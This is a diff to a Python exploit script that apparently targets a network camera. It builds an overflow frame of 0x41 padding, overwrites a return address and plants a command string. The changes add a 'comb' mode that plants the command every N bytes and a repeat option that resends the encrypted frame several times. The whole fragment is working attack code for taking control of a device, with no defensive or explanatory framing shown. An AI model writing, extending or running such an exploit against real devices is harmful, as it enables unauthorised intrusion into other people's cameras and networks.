@@ -46,6 +46,9 @@ def main() -> int:
     ap.add_argument("--cmd-off", type=lambda s: int(s, 0), default=1360)
     ap.add_argument("--declared", type=lambda s: int(s, 0), default=1500)
     ap.add_argument("--channel", type=lambda s: int(s, 0), default=7)
+    ap.add_argument("--comb", type=int, default=0, help="also plant the command every N bytes")
+    ap.add_argument("--comb-start", type=int, default=0)
+    ap.add_argument("--repeat", type=int, default=1, help="send the frame N times")
     ap.add_argument("--dry", action="store_true")
     a = ap.parse_args()
 
@@ -85,13 +88,20 @@ def main() -> int:
     pl = bytearray(b"\x41" * a.declared)
     pl[a.ra_off:a.ra_off + 4] = struct.pack("<I", a.ra)
     if cmd:
-        pl[a.cmd_off:a.cmd_off + len(cmd) + 1] = cmd + b"\x00"
-    rec = bytes(hdr) + bytes(pl)
-    print(f"frame {len(rec)}B declared {a.declared} ra=0x{a.ra:08x} cmd={a.cmd!r}")
+        offs = range(a.comb_start, a.declared - len(cmd) - 1, a.comb) if a.comb else (a.cmd_off,)
+        for off in offs:
+            if a.ra_off <= off < a.ra_off + 4:
+                continue
+            pl[off:off + len(cmd) + 1] = cmd + b"\x00"
+    print(f"frame {28 + a.declared}B declared {a.declared} ra=0x{a.ra:08x} cmd={a.cmd!r}")
     if a.dry:
         return 0
-    cam.send(cam.encrypt(23, rec))
-    print("sent")
+    for i in range(a.repeat):
+        struct.pack_into("<I", hdr, 20, n + i)
+        struct.pack_into("<I", hdr, 24, n + i)
+        cam.send(cam.encrypt(23, bytes(hdr) + bytes(pl)))
+        print(f"sent {i + 1}/{a.repeat}")
+        time.sleep(0.3)
     time.sleep(1)
     return 0
 
